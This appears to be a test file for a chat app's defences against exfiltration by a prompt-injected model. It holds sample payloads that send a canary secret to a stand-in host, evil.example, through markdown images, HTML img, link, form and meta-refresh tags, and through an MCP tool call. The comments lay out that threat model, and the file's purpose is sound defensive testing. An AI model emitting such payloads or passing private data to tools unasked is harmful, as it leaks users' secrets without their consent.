/**
 * Egress the MODEL can open on its own.
 *
 * The app's premise is that nothing leaves the device unless the user connects
 * a remote provider and is told so per message. Model output is untrusted — a
 * prompt-injected model is the threat, not a careless user — and a rendered
 * markdown image is a GET the page makes on the user's behalf with no click.
 *
 * Measured before the fix: `![](https://evil.example/p.png?d=sk-live-CANARY)`
 * rendered as a live cross-origin `<img>`, AND React emitted a
 * `<link rel="preload" as="image">` for it, so the request fired even earlier.
 * Neither the web nor the mobile build shipped a CSP that would stop it.
 */

import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { renderToStaticMarkup } from 'react-dom/server';
import { createElement } from 'react';
import { afterEach, describe, expect, it, vi } from 'vitest';

import { ChatterangEngine, targetFor } from '@/ai/engine';
import type { DestinationDecision, DestinationRequest, ToolDestinationPolicy } from '@/ai/middleware/tools';
import { toolRegistry } from '@/ai/tools/registry';
import { Markdown } from '@/ui/Markdown';
import { MessageView } from '@/features/chat/MessageView';
import { FRAME_CONTENT_SECURITY_POLICY, frameDocument, neutraliseNavigation } from '@/ui/frame';

import {
  CALL,
  GRANTED_PROBE,
  MCP_CALL,
  MCP_CALL_CLEAN,
  SECRET,
  drainEvents,
  leakyTool,
  mcpProbe,
  probeManifest,
  probeResolver,
  recordingBackend,
} from './support/egress-probe';

const CANARY = 'sk-live-EXFIL-CANARY';
const render = (text: string): string => renderToStaticMarkup(createElement(Markdown, { text }));

describe('a model cannot make the page fetch a remote URL', () => {
  it('drops a cross-origin image rather than rendering it', () => {
    const html = render(`![](https://evil.example/p.png?d=${CANARY})`);
    expect(html).not.toContain('evil.example');
    expect(html).not.toContain(CANARY);
  });

  it('drops the preload React would otherwise emit for it', () => {
    // The preload is the earlier of the two requests, so asserting only on
    // `<img>` would have left the faster channel open.
    const html = render(`![](https://evil.example/p.png?d=${CANARY})`);
    expect(html).not.toContain('rel="preload"');
  });

  it('drops a protocol-relative source, which is remote too', () => {
    expect(render(`![](//evil.example/p.png?d=${CANARY})`)).not.toContain('evil.example');
  });

  it('still renders the images the app itself produces', () => {
    // Studio writes data: URIs and attachments are blob:. Refusing these would
    // trade an exfiltration channel for a broken feature.
    expect(render('![](data:image/png;base64,iVBORw0KGgo=)')).toContain('data:image/png');
    expect(render('![](/icon.svg)')).toContain('/icon.svg');
  });

  it('refuses a javascript: link but keeps an ordinary one', () => {
    // A link is a click the user makes deliberately, which is a different act
    // from a fetch the page makes for them — so http(s) stays.
    expect(render('[x](javascript:alert(1))')).not.toContain('javascript:');
    expect(render('[x](https://example.com/)')).toContain('https://example.com/');
  });

  it('ships a CSP that refuses remote images even if a component forgets', () => {
    const html = readFileSync(resolve(process.cwd(), 'index.html'), 'utf8');
    const csp = /content-security-policy"?\s+content="([^"]+)"/i.exec(html)?.[1] ?? '';
    expect(csp).toMatch(/img-src/);
    expect(csp).not.toMatch(/img-src[^;]*\*/);
    expect(csp).not.toMatch(/img-src[^;]*https:(?!\/)/);
  });
});

/**
 * `render_html` is the other place model bytes become a rendered document, and
 * the model writes the whole fragment rather than one URL.
 *
 * The comment above the iframe claimed "No scripts, no same-origin, no
 * network". `sandbox=""` delivers the first two; it has never had anything to
 * say about subresource loading, so the third was false and an `<img>` in the
 * fragment was the same zero-click GET that markdown had.
 */
describe('a model cannot make its rendered HTML fetch a remote URL', () => {
  const message = {
    id: 'm1',
    chatId: 'c1',
    role: 'assistant' as const,
    content: '',
    createdAt: 0,
    toolCalls: [
      {
        id: 't1',
        name: 'render_html',
        input: {
          html: `<img src="https://evil.example/p.png?d=${CANARY}"><link rel="stylesheet" href="https://evil.example/s.css?d=${CANARY}">`,
        },
        output: 'ok',
      },
    ],
  };

  const frame = (): string =>
    renderToStaticMarkup(
      createElement(MessageView, {
        message,
        showThinking: false,
        onRegenerate: () => {},
        onEdit: () => {},
      }),
    );

  it('renders the fragment inside a document that refuses every remote fetch', () => {
    const html = frame();
    // The iframe is really there and really carries the model's markup —
    // otherwise the policy assertions below would be about nothing.
    expect(html).toMatch(/srcdoc=/i);
    expect(html).toContain('evil.example');

    const doc = /srcdoc="([^"]*)"/i.exec(html)?.[1] ?? '';
    expect(doc).toContain('Content-Security-Policy');
    expect(doc).toContain('default-src &#x27;none&#x27;');
    // Nothing that reaches the network is named. `data:` is the app's own
    // images; a scheme that leaves the device is not in the policy at all.
    expect(FRAME_CONTENT_SECURITY_POLICY).not.toMatch(/https?:/);
    expect(FRAME_CONTENT_SECURITY_POLICY).not.toMatch(/\*/);
  });

  it('puts the policy before the model’s bytes, where a meta CSP still counts', () => {
    // A `<meta>` policy governs what follows it. After the fragment it is
    // decoration, so the ordering is the mechanism and not house style.
    const doc = frameDocument('<img src="https://evil.example/p.png">');
    expect(doc.indexOf('Content-Security-Policy')).toBeLessThan(doc.indexOf('evil.example'));
  });

  it('keeps the sandbox attribute, which stops the things a CSP does not', () => {
    // The two are not substitutes: the CSP does not revoke same-origin or stop
    // top-level navigation, and the sandbox does not stop a fetch.
    expect(frame()).toContain('sandbox=""');
  });
});

/**
 * The channel neither the sandbox nor the policy closes: one click.
 *
 * `sandbox=""` withholds top-level navigation and popups. It does not stop the
 * frame navigating ITSELF, which is what `<a href>` does by default. CSP has
 * nothing for it either — `navigate-to` never shipped, and `default-src 'none'`
 * governs fetches. So a link the model wrote was a GET to an origin the model
 * chose, with whatever it put in the query string, on web and on mobile.
 */
describe('a model cannot make one click into a request', () => {
  it('is a real probe: the fragment really carries a live link before the rewrite', () => {
    const fragment = `<a href="https://evil.example/x?d=${CANARY}">tap me</a>`;
    expect(/href="https:/.test(fragment)).toBe(true);
  });

  it('strips the href, and keeps it visible as data the reader can inspect', () => {
    const out = neutraliseNavigation(`<a href="https://evil.example/x?d=${CANARY}">tap me</a>`);
    expect(out).not.toMatch(/\shref=/);
    expect(out).toContain('tap me');
    // Not deleted: the user can still read where the model wanted to send them.
    expect(out).toContain('data-withheld-href');
    expect(out).toContain('evil.example');
  });

  it('keeps a same-document fragment link, which goes nowhere', () => {
    expect(neutraliseNavigation('<a href="#section">jump</a>')).toContain('href="#section"');
  });

  it('removes the zero-click version of the same thing', () => {
    // A meta refresh navigates with no click at all, and would have been the
    // sharper half of this defect.
    const out = neutraliseNavigation(
      '<meta http-equiv="refresh" content="0;url=https://evil.example/">x',
    );
    expect(out).not.toContain('http-equiv');
    expect(out).not.toContain('refresh');
  });

  it('disarms forms, which are a click with a payload attached', () => {
    const out = neutraliseNavigation(
      `<form action="https://evil.example/c"><button formaction="https://evil.example/b?d=${CANARY}">go</button></form>`,
    );
    expect(out).not.toMatch(/\saction=/);
    expect(out).not.toMatch(/\sformaction=/);
  });

  it('drops a <base>, which would redirect every relative URL in the fragment', () => {
    expect(neutraliseNavigation('<base href="https://evil.example/">a')).not.toContain('base');
  });

  it('still renders what render_html is for', () => {
    // The control. A rewrite that broke the feature would be "safe" and useless.
    const out = neutraliseNavigation(
      '<style>b{color:red}</style><div class="x"><b>Total</b> 42</div>' +
        '<img src="data:image/png;base64,iVBORw0KGgo=">',
    );
    expect(out).toContain('<style>b{color:red}</style>');
    expect(out).toContain('<b>Total</b> 42');
    expect(out).toContain('class="x"');
    expect(out).toContain('src="data:image/png;base64,iVBORw0KGgo="');
  });

  it('runs on the path the app actually uses', () => {
    // frameDocument is what MessageView calls, so the rewrite has to be there
    // and not merely exported.
    const doc = frameDocument(`<a href="https://evil.example/?d=${CANARY}">x</a>`);
    expect(doc).not.toMatch(/\shref="https/);
    expect(doc).toContain('Content-Security-Policy');
  });
});

/**
 * THE ROUTE #6 IS ABOUT, END TO END.
 *
 * A tool reads something private; the model pastes it into the arguments of an
 * MCP call; the dispatcher hands the call to a server. No markup and no click:
 * the model composes the request and the app sends it. Driven against a LOCAL
 * model, where the tool-output sheet never runs, so the only thing between the
 * secret and the server is the grant at dispatch.
 *
 * The script: read the secret, then file a harmless note, then file the secret
 * — three batches, each its own model turn.
 */
describe('a model cannot hand what a tool read to an MCP server unasked', () => {
  afterEach(() => {
    toolRegistry.unregister('leaky');
    toolRegistry.unregister('mcp:notes.note');
  });

  function setUp() {
    const probe = mcpProbe();
    toolRegistry.register(leakyTool);
    toolRegistry.register(probe.tool);
    const engine = new ChatterangEngine({ resolver: probeResolver, fallbackBackendId: null });
    const local = recordingBackend([CALL, MCP_CALL_CLEAN, MCP_CALL, 'Done.']);
    engine.router.register('scripted', local.adapter);

    const run = (mcpEgress?: ToolDestinationPolicy) =>
      drainEvents(
        engine.stream({
          messages: [{ role: 'user', content: 'tidy up my notes' }],
          target: targetFor('llama-cpp', probeManifest.id, probeManifest.name, 'scripted'),
          toolIds: ['leaky', probe.tool.id],
          mcpEgress,
        }),
      );
    const carried = (): boolean =>
      probe.call.mock.calls.some((args) => JSON.stringify(args).includes(SECRET));
    return { probe, local, run, carried };
  }

  it('is a real route: the model has the secret when it writes the last call', async () => {
    const { local, run } = setUp();
    await run();
    expect(local.seen).toHaveLength(4);
    expect(JSON.stringify(local.seen[2]!.messages)).toContain(SECRET);
  });

  it('sends nothing to the server when nothing was allowed', async () => {
    const { probe, run, carried } = setUp();
    await run();
    expect(probe.call).not.toHaveBeenCalled();
    expect(carried()).toBe(false);
  });

  it('asks again for the later call after the calls on screen were allowed, and holds it back', async () => {
    const { probe, run, carried } = setUp();
    const request = vi.fn(async (_asked: DestinationRequest): Promise<DestinationDecision> => 'deny');
    request.mockResolvedValueOnce('calls');

    await run({ isGranted: () => false, request });

    // A "send these calls" answer covered the harmless call it was given over,
    // and nothing after it.
    expect(request).toHaveBeenCalledTimes(2);
    expect(request.mock.calls[0]![0].calls[0]!.preview).not.toContain(SECRET);
    // The second sheet shows the person exactly what the model is trying to send.
    expect(request.mock.calls[1]![0].calls[0]!.preview).toContain(SECRET);
    expect(probe.call).toHaveBeenCalledOnce();
    expect(probe.call).toHaveBeenCalledWith('notes', 'note', { text: 'a shopping list' }, undefined);
    expect(carried()).toBe(false);
  });

  it('is the grant holding it back: a conversation grant does carry the secret', async () => {
    // The paired control. Without it, the tests above hold for a dispatcher
    // that never calls a server at all.
    const { probe, run, carried } = setUp();
    await run(GRANTED_PROBE);
    expect(probe.call).toHaveBeenCalledTimes(2);
    expect(carried()).toBe(true);
  });
});
